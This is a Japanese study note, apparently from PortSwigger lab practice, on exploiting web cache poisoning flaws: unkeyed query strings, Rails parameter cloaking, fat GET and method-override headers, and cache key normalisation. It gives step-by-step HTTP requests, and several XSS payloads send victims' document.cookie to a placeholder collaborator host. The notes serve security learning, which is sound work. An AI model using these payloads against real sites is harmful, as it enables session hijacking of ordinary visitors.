###### キャッシュ実装の欠陥の悪用までの流れ概要

1. キャッシュバスターとして使えるヘッダやリクエスト行などをParam Minerで探す
2. キャッシュバスターを追加する
3. Cache keyの一部だがUnkeyとして使えるコンポーネントを探す。
4. Unkeyコンポーネントにペイロードを注入しリクエスト。レスポンスに反映されていることを確認する
5. キャッシュバスターを削除して本来のキャッシュを汚染する

2. キャッシュバスターを追加し、XSSペイロードなどをポート番号の箇所に注入してリクエスト。

## Unkeyed クエリストリング

#### キャッシュバスターの選定

- 通常キャッシュバスターはクエリストリングに追加する(`GET /?cb=any`)。しかし、クエリストリングがUnkeyだとキャッシュバスターが機能しない。
##### ①Param Miner

1. Add dynamic cachebusterオプションをonに、Cacheオラクルに対してRepeaterでリクエストを送る
2. Logger++でキャッシュバスター付きの実際のリクエストを発見し、Repeaterへ送る。
3. Add dynamic cachebusterオプションをoffにする
4. [2. 実装の欠陥の探索](2.%20実装の欠陥の探索.md#Cacheされている兆候)を確認できるまでリクエスト
5.  リクエスト行や各ヘッダに追加されたキャッシュバスターを上から1つずつ削除しながら、Cacheの兆候を確認する
	- キャッシュ状態が解除されたときのコンポーネントがキャッシュバスターとして有効

###### ②キャッシュとバックエンドの正規化の矛盾を利用する

- 以下のエントリはすべて別々のキャッシュとして扱われるが、バックエンド(アプリケーション)側ではすべて同じとして扱われるのでキャッシュバスターとなる
	- Apache: `GET //`
	- Nginx: `GET /%2F`
	- PHP: `GET /index.php/xyz`
	- .NET: `GET /(A(xyz)/`

### Unkeyedクエリストリングの悪用ステップ

1. [3. 実装の欠陥の悪用](3.%20実装の欠陥の悪用.md#キャッシュバスターの選定)をする
2. キャッシュバスターを加え、クエリストリングがUnkeyであることを確認する
3. クエリストリングにGadget(反射型XSSペイロード等)を追加してキャッシュされるまでリクエストし、ペイロードの反射を確認する
![[Pasted image 20240211170053.png]]

4. ペイロードを以下に変更し、 キャッシュバスターを削除して本来のキャッシュを汚染す
```http
GET /?utm_content='/><script>document.location="https://Collaborator.com?c="+document.cookie</script>
```

## Parameter cloaking

### パラメタ解析の癖を悪用
###### シチュエーション

- [3. 実装の欠陥の悪用](3.%20実装の欠陥の悪用.md#Unkeyed%20クエリストリング)、もしくは[3. 実装の欠陥の悪用](3.%20実装の欠陥の悪用.md#Unkeyed%20クエリパラメタ)でも悪用可能なGadget(XSSペイロード等)が見つからなかった場合

#### 基本概念

- キャッシュとバックエンド(アプリケーションコード)の解析の不一致を利用。
	- お互いの==パラメタ解析アルゴリズム==の違いによるもの。

- パラメタ解析の癖により除外されたパラメタの中に任意のパラメタを「隠蔽」して侵入させ、アプリケーションのロジックに忍ばせる
##### パラメタ解析アルゴリズムの違い

###### キャッシュは認識するが、バックエンドは認識しない場合(デファクトスタンダードな解析)

- クエリパラメタの開始合図として先頭なら`?`を、途中なら`&`を認識し解析する(`?x=1&y=2`)
- 脆弱な解析アルゴリズムだと、先頭でなくても`?`をパラメタの開始として扱う(`?x=1?y=2`)

- もしキャッシュは脆弱な解析アルゴリズムで、バックエンド側はそうでない場合
```http
GET /?example=123?excluded_param=bad-stuff-here
```
- キャッシュは2つ目のパラメタ(`excluded_param`)を認識して排除し、バックエンドは認識しない(2つ目の`?`は認めない)でまとめて1つ目のクエリの値として認識する
	- キャッシュ：`example=123`
	- バックエンド：`example=123?excluded_param=bad-stuff-here //123以降が値`

- もしバックエンド側でexampleパラメタの値(`123~`)を便利なGadgetに渡すなら、ペイロードをCache Keyに影響なく忍び込ませることができる

###### キャッシュは認識しないがバックエンドは認識する場合

- 例えばRuby on Railsでは、`&`と`;`を区切り文字として解釈する
- キャッシュは`&`と`;`を許さない場合
```http
GET /?keyed_param=abc&excluded_param=123;keyed_param=bad-stuff-here
```
- 多くのキャッシュが以下のように切り分けて解釈する
	1. `keyed_param=abc`
	2. `excluded_param=123;keyed_param=bad-stuff-here`
- `keyed_param`はCache keyに含まれ、`excluded_param`は除外する

- (Ruby on Railsの)バックエンドは`&`と`;`を区切り文字として解釈する
	1. `keyed_param=abc`
	2. `excluded_param=123`
	3. `keyed_param=bad-stuff-here`
- ここで特殊な「癖」があり、Ruby on Railsの場合は同じパラメタが複数ある場合(`keyed_param`)、より後に登場した値で上書きする。
- これにより、Cache keyとしては`keyed_param` の値として何も問題のない値(`abc`)が登録されるが、バックエンド側では悪意ある値`bad-staff-here`が渡されている。

- もしバックエンド側で`keyed_param=bad-staff-here`が便利なGadgetに渡されるなら、ペイロードに対するレスポンスが通常のキャッシュでアクセスしても返ってくる

#### ステップ

1. 攻撃候補(jsファイル等)にParam Miner -> rails param cloaking scanで検出されるか？
![[Pasted image 20240210191910.png | 300]]
2. [3. 実装の欠陥の悪用](3.%20実装の欠陥の悪用.md#キャッシュバスターの選定)
3. パラメタ名が被るとより後のパラメタ値で上書きする特性を悪用し、ペイロードを注入する。ペイロード(Gadget)はXSSコンテクスト等を参考にする
```http
GET /jsonp?callback=innnocentFunction&utm_content=123;callback=alert(1)//
```
```http
HTTP/2 200 OK
...
alert(1)//({"country":"United Kingdom"});
```
4. ペイロードを以下に変更する
```
GET/js/geolocate.js?callback=setCountryCookie&utm_content=123;callback=document.location='https://COLLABORATOR_DOMAIN?c='+document.cookie; HTTP/2
```

5. キャッシュバスターを削除し本来のキャッシュを汚染する
[LAB](https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-param-cloaking)

### HTTPメソッドがUnkeyedであることを悪用

###### 基本概念

- ①リクエスト行のHTTPメソッド、もしくは②HTTPメソッドを上書きするヘッダがUnkey + 元々がGETリクエストの場合。
- 攻撃者が汚染したパラメタへのレスポンスがキャッシュされ、==被害者が通常通りページへ本来のメソッドリクエストしても==汚染されたレスポンスが返る

#### HTTPメソッドによる汚染方法3選

- 元のリクエスト
```http
GET /?param=innocent HTTP/1.1
```

##### リクエスト行のHTTPメソッドがUnkeyの場合

###### ①POSTリクエストに変更し、bodyでパラメタを上書きする

```HTTP
POST /?param=innocent HTTP/1.1
...
param=bad-staff-here
```

###### ②fat GET サポートを悪用する

- GETリクエストでコンテンツbodyを持つことを許可する場合
```http
GET /?param=innocent HTTP/1.1
…
param=bad-stuff-here
```

##### "X-HTTP-Method-Override"ヘッダがUnkeyの場合

- GETリクエストでコンテンツbodyを持つことが許可されない
- 加えて、リクエスト行のHTTPメソッドがCache Key...

- しかし、`X-HTTP-Method-Override`ヘッダがUnkeyならば、HTTPメソッドを上書きして回避できる
```http
GET /?param=innocent HTTP/1.1
Host: innocent-website.com
X-HTTP-Method-Override: POST
…
param=bad-stuff-here
```

#### HTTPメソッドがUnkeyedであることを悪用したParameter Cloakingステップ

1. [3. 実装の欠陥の悪用](3.%20実装の欠陥の悪用.md#キャッシュバスターの選定)
2. キャッシュバスターを追加し、①リクエスト行のHTTPメソッドがUnkeyなのか、②`X-HTTP-Method-Override`ヘッダがUnkeyなのか判断する
3. まずは何かの実行可能な関数が記載してあるリクエストを探す。
	- 例：`?callaback=innocentFunction`(callbackパラメタの値のJS関数を実行する)

4. ステップ3で判断したUnkeyを用いて、[3. 実装の欠陥の悪用](3.%20実装の欠陥の悪用.md#HTTPメソッドによる汚染方法3選)を使って実行可能な関数を上書きする
```http
GET /jsonp?callback=innnocentFunction
...
X-HTTP-Method-Override: POST

callback=alert(1)//
```
5. ペイロードを以下に変更する
```http
callback=document.location='https://COLLABORATOR_DOMAIN?c='+document.cookie;
```

6. キャッシュバスターを削除し本来のキャッシュを汚染する
[LAB](https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-fat-get)

#### リソース・インポートにおける動的コンテンツの悪用(LABなし)

###### 悪用されるシチュエーション

1. ユーザの入力を反映する動的な外部リソース読み込み
	- 外部リソースのURLへ直接アクセスしても実行されることは非常に稀だし、攻撃者からもURLすべてを操作できないので、無害だと考えられてることが多い。

2. インポートするファイルが`doctype`を定義していない

###### 悪用方法概要

- リソースファイル内へ悪意あるコンテンツを注入し、キャッシュポイズニングを組み合わせることで、被害者がアクセス時に外部リソースを読み込むと、悪意あるコンテンツが実行される
- 例えば、クエリストリングの入力を反映するCSS importステートメントの場合
```http
GET /style.css?excluded_param=123);@import… HTTP/1.1
```
```http
HTTP/1.1 200 OK
…
@import url(/site/home/index.part1.8a6715a2.css?excluded_param=123);@import…
```
- 静的CSSに悪意あるコンテンツを注入し(これで動的になった)、読み込み時にブラウザが自動で悪意あるコンテンツを実行するようにする(サーバエラーも起きる)
```http
GET /style.css?excluded_param=alert(1)%0A{}*{color:red;} HTTP/1.1
```
```http
HTTP/1.1 200 OK
Content-Type: text/html
…
This request was blocked due to…alert(1){}*{color:red;}
```
- キャッシュを汚染する

## 正規化されたCache keyの悪用

- Unkeyを見つける必要はない
###### 悪用するシチュエーション

- 存在しないパスにリクエストを送るとレスポンスのエラーに値が反映される時

###### Cache keyの正規化悪用の基本概念

- 最近のブラウザはURLエンコードし、サーバ側でデコードしない。つまり`<script>~`など入力しても意味がない
- 本来、URLエンコードされたURLにアクセスしてもペイロードは実行されない。
- しかし、Cache keyに加える時、URLエンコードされたものを正規化することがある
- 下記の2つのリクエストはCache keyからしたら同じもの。
```http
GET /example?param=%22%3e%3ctest%3e
```
	↓
```http
GET /example?param="><test>
```

### ステップ

1. 存在しないパスにリクエストを送り、レスポンスのエラーに反映されることを確認する
2. このパスをキャッシュさせる
```http
GET /random</p><script>document.location='https://COLLABORATOR_DOMAIN?c='+document.cookie;</script><p>foo
```
3. キャッシュした状態でこのURLを被害者にDeliver
```http
GET /example?xss='><script>document.location='https://COLLABORATOR_DOMAIN?c='+document.cookie;</script>
```
